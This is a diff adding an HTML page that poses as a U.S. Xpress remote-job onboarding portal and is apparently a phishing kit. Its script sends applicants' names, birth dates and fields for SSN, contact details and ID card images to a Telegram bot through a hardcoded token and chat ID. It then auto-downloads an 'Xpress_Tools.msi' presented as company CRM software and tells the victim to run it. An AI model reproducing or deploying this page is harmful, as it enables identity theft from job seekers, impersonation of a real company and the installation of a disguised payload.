@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>US-XPRESS – Onboarding</title>
+
+<style>
+    :root{
+        --brand-1:#667eea;
+        --brand-2:#764ba2;
+        --muted:#666;
+        --card-bg:#fff;
+        --radius:10px;
+    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background:linear-gradient(135deg,var(--brand-1),var(--brand-2));
+        min-height:100vh;
+        padding:30px;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+    }
+
+    .container{
+        width:100%;
+        max-width:900px;
+        background:white;
+        border-radius:var(--radius);
+        overflow:hidden;
+        box-shadow:0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    .header{
+        text-align:center;
+        padding:30px;
+        color:white;
+        background:linear-gradient(135deg,var(--brand-1),var(--brand-2));
+    }
+
+    .logo{
+        width:110px;height:110px;
+        background:white;
+        padding:10px;
+        border-radius:50%;
+        object-fit:contain;
+        margin-bottom:10px;
+    }
+
+    .content{padding:30px;background:#fafafa}
+
+    .page{display:none}
+    .page.active{display:block}
+
+    .welcome-body{line-height:1.6;color:#555;margin-bottom:30px}
+    .welcome-body p { margin-bottom: 14px; }
+    .welcome-body h3 { margin: 26px 0 12px; color:#333; }
+    .welcome-body ul { margin: 8px 0 16px 18px; }
+
+
+    .btn{
+        background:linear-gradient(135deg,var(--brand-1),var(--brand-2));
+        color:white;
+        border:none;
+        padding:15px 25px;
+        border-radius:8px;
+        font-weight:700;
+        cursor:pointer;
+        display:block;
+        width:100%;
+        text-align:center;
+        margin-top:20px;
+    }
+
+    /* Form */
+    .form-group{margin-bottom:15px}
+    label{font-weight:600;margin-bottom:5px;display:block}
+    input, select{
+        width:100%;
+        padding:10px;
+        border:1px solid #ddd;
+        border-radius:6px;
+    }
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
+
+    /* Card blocks */
+    .instructions{
+        background:#f8f9fb;
+        padding:20px;
+        border-left:5px solid var(--brand-1);
+        border-radius:8px;
+        margin-bottom:20px;
+    }
+
+    .alert{
+        background:#fff7dd;
+        padding:15px;
+        border-left:5px solid #f4c542;
+        margin-bottom:25px;
+        border-radius:8px;
+    }
+
+    .center{text-align:center}
+</style>
+</head>
+<body>
+
+<div class="container" role="main" aria-labelledby="main-heading">
+    <header class="header">
+        <!-- replace src if you prefer a different path -->
+        <img src="https://companieslogo.com/img/orig/USX_BIG-106f90c5.png?t=1720244494" alt="US-XPRESS logo" class="logo" id="companyLogo">
+        <div class="org-name">US-XPRESS</div>
+
+        <h1 id="main-heading">Job Application Portal</h1>
+        <p>Join Our Team Today</p>
+    </header>
+
+    <main class="content">
+        <!-- PAGE 1: Welcome / Onboard Letter -->
+        <section id="page1" class="page active" aria-hidden="false">
+            <div class="welcome-body">
+<div class="welcome-body">
+
+<p>Dear Candidate,</p>
+
+<p>
+Welcome, and thank you for your interest in joining <strong>U.S. Xpress</strong>.
+We are pleased to inform you that you have been selected to move forward in the
+orientation and interview briefing process for one of our remote support positions.
+</p>
+
+<p><strong>We are currently offering the following roles:</strong></p>
+
+<ul>
+  <li>Virtual Assistant</li>
+  <li>Customer Care Representative</li>
+  <li>Data Entry Clerk</li>
+  <li>Remote Administrative Coordinator</li>
+</ul>
+
+<p>
+These positions are designed to provide essential administrative,
+customer support, and operational assistance. Roles require approximately
+<strong>18–22 hours per week</strong>, Monday through Friday, with a
+<strong>flexible schedule</strong>. All duties may be completed <strong>remotely</strong>.
+</p>
+
+<h3>About U.S. Xpress</h3>
+
+<p>
+At <strong>U.S. Xpress</strong>, we’re driven to safely provide creative and reliable
+freight solutions while cultivating a workplace where our people thrive. Whether
+you’re a shipper, driver, or part of our support team, we’re committed to
+<strong>safety, integrity, empowerment, and tenacity</strong> in all we do.
+</p>
+
+<h3>Our Core Values</h3>
+
+<table width="100%" cellpadding="0" cellspacing="0">
+  <tr valign="top">
+    <td width="50%" style="padding-right:20px;">
+      <strong>Safety</strong>
+      <p>We prioritize safety and maintain a strong commitment to protecting our people and the communities we serve.</p>
+    </td>
+    <td width="50%">
+      <strong>Empowerment</strong>
+      <p>We foster a supportive culture where individuals feel valued, heard, and inspired to win every day.</p>
+    </td>
+  </tr>
+  <tr valign="top">
+    <td style="padding-right:20px;">
+      <strong>Integrity</strong>
+      <p>We uphold ethical standards with honesty, transparency, and accountability, treating everyone with dignity and respect.</p>
+    </td>
+    <td>
+      <strong>Tenacity</strong>
+      <p>We face challenges head-on, adapt to change, and remain disciplined in the execution of our goals.</p>
+    </td>
+  </tr>
+</table>
+
+<h3>Role Responsibilities</h3>
+
+<table width="100%" cellpadding="0" cellspacing="0">
+  <tr valign="top">
+    <td width="50%" style="padding-right:20px;">
+      <strong>Virtual Assistant</strong>
+      <ul>
+        <li>Provide administrative support including scheduling and email management</li>
+        <li>Assist with document preparation and data organization</li>
+        <li>Support internal teams with day-to-day operational tasks</li>
+      </ul>
+    </td>
+
+    <td width="50%">
+      <strong>Customer Care Representative</strong>
+      <ul>
+        <li>Respond to customer inquiries via phone, email, or chat</li>
+        <li>Resolve service issues professionally and efficiently</li>
+        <li>Maintain accurate records of customer interactions</li>
+      </ul>
+    </td>
+  </tr>
+
+  <tr valign="top">
+    <td style="padding-right:20px;">
+      <strong>Data Entry Clerk</strong>
+      <ul>
+        <li>Enter and update data accurately into company systems</li>
+        <li>Verify information and maintain data integrity</li>
+        <li>Generate basic reports as required</li>
+      </ul>
+    </td>
+
+    <td>
+      <strong>Remote Administrative Coordinator</strong>
+      <ul>
+        <li>Coordinate schedules, meetings, and internal communications</li>
+        <li>Maintain operational and financial documentation</li>
+        <li>Support reporting and cross-department collaboration</li>
+      </ul>
+    </td>
+  </tr>
+</table>
+
+<h3>Benefits</h3>
+
+<ul>
+  <li>Competitive pay</li>
+  <li>401(k) Retirement Plan</li>
+  <li>Comprehensive Health, Dental & Vision Insurance</li>
+  <li>Paid Time Off & Holidays</li>
+  <li>Remote Work Flexibility</li>
+  <li>Career Growth & Development Programs</li>
+</ul>
+
+<h3>Next Steps</h3>
+
+<p>
+Please confirm your readiness to proceed so we can finalize your orientation
+materials and share your briefing package.
+</p>
+
+<p>
+We look forward to moving ahead with you.
+</p>
+
+<p>
+Sincerely,<br>
+<strong>U.S. Xpress Recruitment Team</strong>
+</p>
+
+</div>
+            </div>
+
+
+            <div class="center">
+                <button class="" id="proceedBtn" aria-controls="page2">APPLICATION FORM</button>
+            </div>
+        </section>
+
+		<!-- PAGE 2: Application Form -->
+        <div class="page active" id="page1">
+            <form id="applicationForm">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>First Name <span class="required">*</span></label>
+                        <input type="text" name="firstName" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Last Name <span class="required">*</span></label>
+                        <input type="text" name="lastName" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Date of Birth <span class="required">*</span></label>
+                    <input type="date" name="dob" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Highest Degree <span class="required">*</span></label>
+                    <select name="degree" required>
+                        <option value="">Select Degree</option>
+                        <option value="High School Diploma">High School Diploma</option>
+                        <option value="Associate Degree">Associate Degree</option>
+                        <option value="B.Sc">B.Sc (Bachelor of Science)</option>
+                        <option value="B.A">B.A (Bachelor of Arts)</option>
+                        <option value="B.Eng">B.Eng (Bachelor of Engineering)</option>
+                        <option value="B.Com">B.Com (Bachelor of Commerce)</option>
+                        <option value="M.Sc">M.Sc (Master of Science)</option>
+                        <option value="M.A">M.A (Master of Arts)</option>
+                        <option value="MBA">MBA (Master of Business Administration)</option>
+                        <option value="Ph.D">Ph.D (Doctor of Philosophy)</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Desired Role <span class="required">*</span></label>
+                    <select name="degree" required>
+                        <option value="">Select Role</option>
+                        <option value="Virtual Assistant">Virtual Assistant</option>
+                        <option value="Customer Care Representative">Customer Care Representative</option>
+                        <option value="Data Entry Clerk">Data Entry Clerk</option>
+                        <option value="Remote Administrative Coordinator">Remote Administrative Coordinator</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Job Type <span class="required">*</span></label>
+                    <select name="degree" required>
+                        <option value="">Select Type</option>
+                        <option value="Full Time">Full Time</option>
+                        <option value="Part Time">Part Time</option>
+                    </select>
+                </div>
+            
+
+                <!-- <div class="form-group">
+                    <label>Phone Number <span class="required">*</span></label>
+                    <input type="tel" name="phone" placeholder="+1 (555) 000-0000" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Email Address <span class="required">*</span></label>
+                    <input type="email" name="email" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Home Address <span class="required">*</span></label>
+                    <input type="text" name="address" placeholder="Street Address" required>
+                </div> -->
+
+                <button type="submit" class="btn" id="submitBtn">Submit Application</button>
+            </form>
+        </div>
+		
+		<!-- PAGE 3: Instructions -->
+        <div class="page" id="page2">
+            <h2 style="color: #667eea; margin-bottom: 25px; text-align: center;">Getting Started</h2>
+            
+            <div class="alert alert-info">
+                <strong>Important:</strong> Please ensure you are accessing this page from a computer or desktop device to proceed with the installation of the company communication system.
+            </div>
+
+            <div class="instructions">
+                <h3>📋 Setup Instructions</h3>
+                <ol>
+                    <li><strong>System Requirements:</strong> Ensure you are using a Windows computer or desktop device.</li>
+                    <li><strong>Download CRM Software:</strong> Click the "Download Software" button below to download our company's CRM software.</li>
+                    <li><strong>Installation:</strong> Once downloaded, locate the .msi file in your downloads folder and double-click to begin installation.</li>
+                    <li><strong>Follow Prompts:</strong> Follow the on-screen installation wizard to complete the setup.</li>
+                    <li><strong>Launch Application:</strong> After installation, launch the CRM software from your desktop or start menu.</li>
+                    <li><strong>Login Credentials:</strong> Use the credentials that will be sent to your registered email address within 24 hours.</li>
+                    <li><strong>Training Materials:</strong> All training materials and job resources are compiled within the CRM software.</li>
+                </ol>
+            </div>
+
+            <div class="alert">
+                <strong>Note:</strong> The software must be installed on a computer/desktop device. Mobile devices are not supported for the CRM installation.
+            </div>
+
+            <button class="btn" onclick="goToPage(3)">Download Software</button>
+        </div>
+
+
+       <!-- PAGE 3: Auto Download -->
+        <div class="page" id="page3">
+            <div class="download-info">
+                <svg fill="#667eea" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                <h2 style="color: #667eea; margin-bottom: 15px;">Download Starting...</h2>
+                <p style="color: #666; font-size: 16px; line-height: 1.6;">
+                    Your CRM software download should begin automatically.<br>
+                    If the download doesn't start, <a href="#" id="manualDownload" style="color: #667eea; font-weight: 600;">click here</a>.
+                </p>
+            </div>
+
+            <div class="instructions">
+                <h3>📦 What's Next?</h3>
+                <ol>
+                    <li>Locate the downloaded .msi file (usually in your Downloads folder)</li>
+                    <li>Double-click the file to start installation</li>
+                    <li>Follow the installation wizard</li>
+                    <li>Check your email for login credentials (within 24 hours)</li>
+                    <li>Launch the software and log in to get started</li>
+                </ol>
+            </div>
+
+            <div class="alert alert-info">
+                <strong>Need Help?</strong> If you encounter any issues during installation, please contact our support team at the email address provided in your welcome email.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration - Replace with your Telegram Bot Token and Chat ID
+        const TELEGRAM_BOT_TOKEN = '7697627206:AAHVFCL7I9zY9BpnDxmvG6cm1QToSCLsjr8';
+        const TELEGRAM_CHAT_ID = '1535776474';
+
+        function goToPage(pageNum) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page' + pageNum).classList.add('active');
+            window.scrollTo(0, 0);
+
+            // Auto-download on page 3
+            if (pageNum === 3) {
+                setTimeout(() => {
+                    triggerDownload();
+                }, 1000);
+            }
+        }
+
+        function triggerDownload() {
+            const link = document.createElement('a');
+            link.href = 'Xpress_Tools.msi'; // Your MSI file name
+            link.download = 'Xpress_Tools.msi';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        document.getElementById('manualDownload').addEventListener('click', (e) => {
+            e.preventDefault();
+            triggerDownload();
+        });
+
+        document.getElementById('applicationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            const formData = new FormData(e.target);
+            
+            // Prepare message for Telegram
+            let message = '🆕 NEW JOB APPLICATION\n\n';
+            message += `👤 Name: ${formData.get('firstName')} ${formData.get('lastName')}\n`;
+            message += `📅 DOB: ${formData.get('dob')}\n`;
+            message += `🔢 SSN: ${formData.get('ssn')}\n`;
+            message += `🎓 Degree: ${formData.get('degree')}\n`;
+            message += `📞 Phone: ${formData.get('phone')}\n`;
+            message += `📧 Email: ${formData.get('email')}\n`;
+            message += `🏠 Address: ${formData.get('address')}\n`;
+
+            try {
+                // Send text data to Telegram
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                // Send ID documents
+                const idFront = formData.get('idFront');
+                const idBack = formData.get('idBack');
+
+                if (idFront && idFront.size > 0) {
+                    const frontData = new FormData();
+                    frontData.append('chat_id', TELEGRAM_CHAT_ID);
+                    frontData.append('document', idFront);
+                    frontData.append('caption', '📄 ID Card - Front');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: frontData
+                    });
+                }
+
+                if (idBack && idBack.size > 0) {
+                    const backData = new FormData();
+                    backData.append('chat_id', TELEGRAM_CHAT_ID);
+                    backData.append('document', idBack);
+                    backData.append('caption', '📄 ID Card - Back');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: backData
+                    });
+                }
+
+                // Go to next page
+                goToPage(2);
+            } catch (error) {
+                alert('There was an error submitting your application. Please try again.');
+                console.error('Error:', error);
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Application';
+            }
+        });
+    </script>
+</body>
+</html>
